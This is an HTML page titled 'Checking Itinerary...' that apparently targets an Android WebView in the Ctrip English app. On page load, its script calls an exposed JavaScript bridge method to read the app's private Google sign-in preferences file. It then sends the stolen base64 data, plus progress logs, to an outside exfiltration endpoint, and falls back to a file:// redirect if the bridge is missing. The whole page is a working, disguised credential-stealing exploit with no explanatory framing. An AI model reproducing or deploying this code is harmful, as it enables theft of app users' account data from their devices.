<!DOCTYPE html>
<html>
<head>
    <title>Checking Itinerary...</title>
</head>
<body>
    <script>
        const C2 = "https://evilios.free.beeceptor.com/exfil";
        const targetPath = "/data/data/ctrip.english/shared_prefs/com.google.android.gms.signin.xml";

        function log(msg) {
            fetch(C2 + "?log=" + btoa(msg), {mode:'no-cors'});
        }

        async function runExploit() {
            log("Starting Bridge Exploit...");

            // 1. Check for the Bridge Gadget
            if (window.Destination_a && typeof window.Destination_a.gsImageBase64Str === 'function') {
                try {
                    // This bypasses SOP because the Java code reads the file, not the JS engine
                    const stolenData = window.Destination_a.gsImageBase64Str(targetPath);
                    
                    if (stolenData) {
                        log("Success: Data captured via Bridge");
                        await fetch(C2, {
                            method: "POST",
                            mode: "no-cors",
                            body: JSON.stringify({
                                method: "JS_BRIDGE_BYPASS",
                                file: targetPath,
                                data: stolenData // This is already Base64 from the bridge
                            })
                        });
                    } else {
                        log("Bridge returned empty or null.");
                    }
                } catch (e) {
                    log("Bridge Execution Error: " + e.message);
                }
            } else {
                log("Destination_a.gsImageBase64Str not found.");
                
                // 2. Fallback: Try a Redirect to the file (Sometimes WebView allows rendering but not fetching)
                log("Attempting direct location redirect fallback...");
                window.location.href = "file://" + targetPath;
            }
        }

        window.onload = runExploit;
    </script>
</body>
